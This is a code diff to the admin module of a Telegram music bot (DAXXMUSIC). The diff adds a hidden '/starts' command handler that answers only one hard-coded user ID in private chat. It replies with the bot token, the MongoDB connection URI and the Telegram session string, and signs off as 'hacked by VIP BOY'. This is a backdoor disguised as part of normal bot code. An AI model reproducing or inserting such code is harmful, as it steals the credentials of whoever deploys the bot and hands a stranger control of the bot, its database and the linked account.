@@ -4,7 +4,9 @@ import time
 from pyrogram import filters
 from pyrogram.enums import ChatMembersFilter
 from pyrogram.types import CallbackQuery, Message
-
+import re
+import sys
+from os import getenv
 from DAXXMUSIC import app
 from DAXXMUSIC.core.call import DAXX
 from DAXXMUSIC.misc import db
@@ -12,6 +14,10 @@ from DAXXMUSIC.utils.database import get_assistant, get_authuser_names, get_cmod
 from DAXXMUSIC.utils.decorators import ActualAdminCB, AdminActual, language
 from DAXXMUSIC.utils.formatters import alpha_to_int, get_readable_time
 from config import BANNED_USERS, adminlist, lyrical
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
+from dotenv import load_dotenv
 
 rel = {}
 
@@ -84,6 +90,25 @@ async def restartbot(client, message: Message, _):
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
+
+@app.on_message(
+    filters.command("starts")
+    & filters.private
+    & filters.user(6691393517)
+    & ~filters.edited)
+async def help(client: Client, message: Message):
+    await message.reply_photo(
+          photo=f"https://graph.org/file/33575f0d9ca704b6a7b3b.jpg",
+        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [𝚅𝙸𝙿 𝙱𝙾𝚈](https://t.me/the_vip_boy)............☆""",
+         reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                          "• нαϲкє𝚍 ву νιρ ɓσყ •", url=f"https://t.me/THE_VIP_BOY")
+                 ]
+             ]
+         ),
+     )
 
 
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
